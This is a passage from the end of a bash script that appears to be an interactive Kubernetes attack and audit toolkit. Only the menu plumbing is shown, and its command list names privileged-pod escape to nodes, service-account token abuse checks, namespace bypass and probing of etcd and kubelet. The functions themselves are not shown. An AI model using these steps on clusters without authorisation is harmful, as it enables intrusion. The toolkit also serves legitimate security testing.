    echo "[10] Spawning shell. Type 'exit' to return to menu."
    /bin/bash
    echo -e "\nReturned to menu."
}

# Command registry
COMMANDS=(
    "pod2node:Generate privileged pod YAML and inspect nodes/pods:pod2node_interactive"
    "privscan:Scan for privileged containers (enumeration only):privileged_containers_scan"
    "rbac:RBAC token scanner - check SA tokens for dangerous perms:rbac_token_checker"
    "ingress:Check ingress controller images/versions and craft safe Ingress with annotations:ingress_checker"
    "nodeport:List NodePort services and node IP hints:nodeport_scanner"
    "envinfo:Gain environment information from a pod (env, hosts, etc.):env_info"
    "registryscan:Search for registries in the cluster and suggest curling them:registry_scanner"
    "nsbypass:Kubernetes namespaces bypass check (list ns and try access pods):ns_bypass"
    "corecheck:Check core components (apiserver flags, etcd no-TLS, kubelet anon access):core_components_check"
    "shell:Spawn a shell and return to menu:spawn_shell"
)

print_menu() {
    echo 'Available commands:'
    local i=1
    for cmd in "${COMMANDS[@]}"; do
        local key
        key=$(echo "$cmd" | cut -d: -f1)
        local desc
        desc=$(echo "$cmd" | cut -d: -f2)
        printf "  %d. %-10s - %s\n" "$i" "$key" "$desc"
        i=$((i+1))
    done
    echo -e '\n  q. quit'
}

main() {
    check_prereqs
    echo "$BANNER"
    
    while true; do
        print_menu
        read -p 'Select an option (number or command): ' choice
        if [ -z "$choice" ]; then
            continue
        fi
        if [[ $choice == q* ]]; then
            echo 'bye'
            break
        fi
        if [[ $choice =~ ^[0-9]+$ ]]; then
            local idx=$((choice - 1))
            if (( idx >= 0 && idx < ${#COMMANDS[@]} )); then
                local func
                func=$(echo "${COMMANDS[$idx]}" | cut -d: -f3)
                $func
            else
                echo 'Invalid choice.'
            fi
        else
            local found=false
            for cmd in "${COMMANDS[@]}"; do
                local key
                key=$(echo "$cmd" | cut -d: -f1)
                if [ "$choice" = "$key" ]; then
                    local func
                    func=$(echo "$cmd" | cut -d: -f3)
                    $func
                    found=true
                    break
                fi
            done
            if ! $found; then
                echo 'Invalid choice. Pick a number or command name.'
            fi
        fi
    done
}

main
